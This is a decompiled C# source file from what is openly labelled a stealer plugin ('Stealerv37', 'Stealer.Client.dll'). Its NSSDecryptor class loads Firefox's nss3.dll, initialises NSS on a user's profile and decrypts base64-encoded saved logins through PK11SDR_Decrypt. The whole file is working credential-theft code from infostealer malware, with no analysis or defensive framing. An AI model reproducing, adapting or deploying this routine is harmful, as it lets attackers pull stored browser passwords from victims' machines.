// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.NSSDecryptor
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class NSSDecryptor
{
  [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
  private static extern int NSS_Init(string configdir);

  [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
  private static extern int NSS_Shutdown();

  [DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
  private static extern int PK11SDR_Decrypt(
    ref NSSDecryptor.SECItem data,
    ref NSSDecryptor.SECItem result,
    int cx);

  public static bool Initialize(string profilePath)
  {
    try
    {
      string path = "C:\\Program Files\\Mozilla Firefox";
      if (!Directory.Exists(path))
        return false;
      Environment.SetEnvironmentVariable("PATH", $"{Environment.GetEnvironmentVariable("PATH")};{path}");
      return NSSDecryptor.NSS_Init(profilePath) == 0;
    }
    catch
    {
      return false;
    }
  }

  public static string Decrypt(string base64)
  {
    try
    {
      byte[] source = Convert.FromBase64String(base64);
      if (source.Length == 0)
        return (string) null;
      NSSDecryptor.SECItem data = new NSSDecryptor.SECItem()
      {
        Data = Marshal.AllocHGlobal(source.Length),
        Len = source.Length,
        Type = 0
      };
      Marshal.Copy(source, 0, data.Data, source.Length);
      NSSDecryptor.SECItem result = new NSSDecryptor.SECItem();
      int num = NSSDecryptor.PK11SDR_Decrypt(ref data, ref result, 0);
      Marshal.FreeHGlobal(data.Data);
      if (num != 0 || result.Data == IntPtr.Zero)
        return (string) null;
      byte[] numArray = new byte[result.Len];
      Marshal.Copy(result.Data, numArray, 0, result.Len);
      return Encoding.UTF8.GetString(numArray);
    }
    catch
    {
      return (string) null;
    }
  }

  public struct SECItem
  {
    public int Type;
    public IntPtr Data;
    public int Len;
  }
}
